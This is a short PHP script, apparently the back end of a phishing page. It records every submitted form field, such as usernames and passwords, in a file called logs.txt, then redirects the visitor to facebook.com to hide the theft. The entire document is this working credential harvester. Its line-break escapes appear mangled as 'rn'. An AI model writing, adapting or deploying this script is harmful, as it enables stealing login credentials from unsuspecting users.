<?php
header ('Location: http://www.facebook.com');      
$handle = fopen("logs.txt", "a");             
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "rn");
}fwrite($handle, "rn");
fclose($handle);
exit;
?>
